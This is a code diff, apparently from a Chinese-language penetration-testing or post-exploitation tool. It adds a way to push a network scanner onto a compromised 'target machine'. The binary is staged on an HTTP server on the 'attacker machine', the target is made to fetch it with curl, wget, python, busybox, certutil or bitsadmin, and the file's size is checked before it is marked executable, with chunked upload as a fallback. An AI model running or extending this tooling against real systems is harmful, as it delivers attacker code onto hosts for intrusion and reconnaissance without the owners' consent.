@@ -99,9 +99,79 @@ def _remote_size(sess, platform: str, path: str) -> int | None:
     return None
 
 
+#: auto 模式下走 HTTP 拉取的最小文件体积：小文件分片直传更快（省掉可达性预检与工具往返），
+#: 大二进制（fscan ~8MB）才值得起一次 HTTP 拉取。
+AUTO_HTTP_MIN_BYTES = 512 * 1024
+
+#: HTTP 拉取单次尝试上限：没有超时参数的工具（certutil / Invoke-WebRequest / bitsadmin）
+#: 在目标不通时会各自长挂，自动流程必须限次数 + 限时长。
+PULL_MAX_TOOLS = 2
+PULL_TIMEOUT = 90.0
+PULL_PER_TIMEOUT = 45.0
+
+
+def _pull_scanner(sess, platform: str, data: bytes, name: str, remote_path: str, log,
+                  host: str = "") -> bool:
+    """HTTP 拉取上传扫描器（与文件管理同一通道）：目标机用 curl/wget 自取 + 字节数校验。
+
+    失败返回 False，由调用方回退分片直传（不静默、不伪造成功）。步骤：
+    1) 暂存文件到攻击机临时 HTTP 服务（随机 token 路径）；
+    2) **可达性预检**——目标连不上就直接放弃（否则下载工具会逐个长超时）；
+    3) 探测目标可用下载工具，按 curl→wget→python→busybox 顺序尝试（限次数/时限）；
+    4) 拉取后按目标侧真实字节数校验，条目立即撤下。
+    """
+    from ..service import filestage as stage_svc
+
+    if not host:
+        log("[http] 未配置攻击机地址，跳过 HTTP 拉取")
+        return False
+    item = None
+    try:
+        item = stage_svc.STAGE.add(name, data)
+        port = stage_svc.STAGE.bound_port
+        # 候选地址：项目攻击机 IP 优先，其次回环（同机联调 / 端口映射靶场）
+        candidates = [h for h in dict.fromkeys([host, "127.0.0.1"]) if h]
+        reachable = next((h for h in candidates if stage_svc.can_reach(sess, h, port)), "")
+        if not reachable:
+            log(f"[http] 目标机连不到攻击机 {host}:{port}（出站受限 / 网段不通），改走分片直传")
+            return False
+        if reachable != host:
+            log(f"[http] 攻击机地址 {host} 不可达，回退用 {reachable} 拉取")
+        url = f"http://{reachable}:{port}/s/{item.token}/{item.name}"
+        tools = stage_svc.detect_tools(sess)
+        if not tools:
+            log("[http] 目标未检测到 curl/wget/python 等下载工具，改走分片直传")
+            return False
+        log(f"[http] 目标可用下载工具：{'/'.join(tools)} · {url}")
+        res = stage_svc.pull_file(sess, url, remote_path, len(data), platform=platform,
+                                  tools=tools, timeout=PULL_TIMEOUT,
+                                  per_timeout=PULL_PER_TIMEOUT, max_tools=PULL_MAX_TOOLS)
+        for line in res.log:
+            log(f"[http] {line}")
+        if res.ok:
+            log(f"[http] {res.tool} 拉取通过：{res.size} 字节（HTTP 传输，不经会话分片）")
+            return True
+        log(f"[http] 拉取失败（{res.reason}）")
+        return False
+    except Exception as e:  # SessionError / OSError / 其他：如实记录并回退
+        log(f"[http] HTTP 拉取异常：{e}")
+        return False
+    finally:
+        # 拉取结果已定，立即撤下暂存条目（不留暴露面）
+        if item is not None:
+            stage_svc.STAGE.drop(item.token)
+
+
 def _upload_scanner(sess, platform: str, data: bytes, scanner_name: str,
-                    force: bool, remote_dir: str, log) -> tuple[str, bool]:
+                    force: bool, remote_dir: str, log,
+                    transfer: str = "auto", stage_host: str = "") -> tuple[str, bool]:
     """上传扫描器到目标暂存目录，并做**字节数校验**。
+
+    传输方式（transfer）：
+    - ``auto``（默认）：先走 HTTP 拉取（目标机 curl/wget 自取，与文件管理同通道），
+      目标不通外网 / 无下载工具时自动回退分片直传；
+    - ``http``：只走 HTTP 拉取，失败即如实报错；
+    - ``chunk``：只走分片直传（旧行为）。
 
     只按「文件存在且非空」判定缓存会让截断的残file永远被复用（Go 二进制截断后
     必然 SIGBUS/Bus error）；这里缓存命中要求远端大小与本地一致，上传后必须校验。
@@ -119,13 +189,33 @@ def _upload_scanner(sess, platform: str, data: bytes, scanner_name: str,
     mk = (f'mkdir "{remote_dir}"' if platform == "windows"
           else f"mkdir -p {shlex.quote(remote_dir)}")
     sess.exec(mk, timeout=20)
+
+    if transfer in ("auto", "http"):
+        use_http = True
+        if transfer == "auto" and len(data) < AUTO_HTTP_MIN_BYTES:
+            # 小文件分片直传更快：省掉可达性预检与下载工具往返（大二进制才值得 HTTP 拉取）
+            use_http = False
+            log(f"[http] 文件较小（{len(data)} 字节 < {AUTO_HTTP_MIN_BYTES}），直接分片直传；"
+                "需要强制 HTTP 拉取请选 transfer=http")
+        if use_http:
+            if _pull_scanner(sess, platform, data, name, scanner_path, log, stage_host):
+                after = _remote_size(sess, platform, scanner_path)
+                if after == len(data):
+                    if platform != "windows":
+                        sess.exec(f"chmod +x {shlex.quote(scanner_path)}", timeout=20)
+                    return scanner_path, False
+                log(f"[http] 拉取后字节数不符（远端 {after} / 本地 {len(data)}），回退分片直传")
+            elif transfer == "http":
+                raise RuntimeError("HTTP 拉取失败（transfer=http 只走该通道）：请确认目标可回连"
+                                   "攻击机，或改用 auto / chunk")
+
     size = sess.upload_file(scanner_path, data)
     after = _remote_size(sess, platform, scanner_path)
     if after != len(data):
         got = "读不到" if after is None else f"远端 {after} 字节"
         raise RuntimeError(f"扫描器上传校验失败：{got} ≠ 本地 {len(data)} 字节"
                            f"（网络中断 / 目标盘满？请重试或换暂存目录）")
-    log(f"已上传扫描器 {size} 字节 → {scanner_path}（校验一致）")
+    log(f"已上传扫描器 {size} 字节 → {scanner_path}（分片直传 · 校验一致）")
     if platform != "windows":
         sess.exec(f"chmod +x {shlex.quote(scanner_path)}", timeout=20)
     return scanner_path, False
@@ -161,6 +251,8 @@ class ScanIn(BaseModel):
     timeoutS: int = 300
     #: 目标上同名文件已存在时是否强制重新上传
     forceUpload: bool = False
+    #: 扫描器传输方式：auto=HTTP 拉取优先+失败回退分片 / http=只走 HTTP 拉取 / chunk=只走分片直传
+    transfer: str = "auto"
     #: 是否对 Web 端口补充抓取页面标题
     probeTitles: bool = True
     #: 目标侧暂存目录（留空 = 默认 /tmp 或 %TEMP%；靶机权限受限时指定可写目录）
@@ -255,8 +347,12 @@ def recon_scan(form: ScanIn, db: Session = Depends(get_db)):
         if form.localScanner:
             log.append(f"使用本地扫描器 tools/{scanner_name}（{len(data)} 字节）")
         try:
+            from ..service import filestage as stage_svc
+
             scanner_path, cached = _upload_scanner(
-                sess, platform, data, scanner_name, form.forceUpload, remote_dir, log.append)
+                sess, platform, data, scanner_name, form.forceUpload, remote_dir, log.append,
+                transfer=form.transfer,
+                stage_host=stage_svc.stage_host(db, s.project_id, s, sess))
         except Exception as e:
             return {"ok": False, "stage": "upload", "error": f"扫描器上传失败：{e}", "log": log}
 
@@ -443,10 +539,14 @@ def _run_scan_job(job: ScanJob, form: ScanIn) -> None:
             if form.localScanner:
                 _push_scan_line(job, f"使用本地扫描器 tools/{scanner_name}（{len(data)} 字节）", "dim")
             try:
+                from ..service import filestage as stage_svc
+
                 job.scanner_path, job.cached = _upload_scanner(
                     sess, platform, data, scanner_name, form.forceUpload,
                     _check_remote_dir(form.remoteDir),
-                    lambda t: _push_scan_line(job, t, "dim"))
+                    lambda t: _push_scan_line(job, t, "dim"),
+                    transfer=form.transfer,
+                    stage_host=stage_svc.stage_host(db, s.project_id, s, sess))
             except HTTPException as e:
                 _finish_job(job, "error", str(e.detail))
                 return
